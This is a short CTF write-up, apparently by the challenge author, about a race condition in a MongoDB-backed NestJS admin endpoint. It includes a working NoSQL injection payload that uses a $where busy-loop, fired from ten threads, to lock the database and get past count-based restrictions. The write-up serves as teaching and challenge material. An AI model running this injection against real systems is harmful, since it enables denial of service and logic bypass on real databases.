---
title: MongoDB Race Condition payload
date: 2024-01-30
categories: [Payload]
tags: [Write up]
---

## Information 
Target: `MongoDB`  
Vulnerability: `Race Condition`

## Desc
MongoDB Race Condition Attack with db lock.  

## Example
### Code
```javascript
// admin.controller.ts
@Post('list')
async getFlagList(@Body() listDto: ListDto): Promise<FlagDocument[]> {
	return await this.adminService.getFlagList(listDto.username);
}
```
### Exploit
```python
import threading
import json

# Logic Vulnerability - Database Lock
def lock():
    res = requests.post(f"{url}/admin/list", headers=auth,
                        json={"username": '''admin", "$or": [{"dummy": "dummy"},{"$where": "date=new Date();do{cur=new Date();}while(cur-date<5000) + 1 || true"}], "":"'''})
    print(res.text)

threads = []
for i in range(10):
    thread = threading.Thread(target=lock)
    threads.append(thread)
    thread.start()
```
It takes a long time to count the number of existing documents in the DB, so logic such as number restrictions can be bypassed.

## Comment
This is part of the solution for the challenge I made. ( For dreamhack X-mas CTF )  
[Challenge Link](https://dreamhack.io/wargame/challenges/1061)  
[Ref](https://www.hahwul.com/2016/01/12/web-hacking-nosql-injection-mongodb/)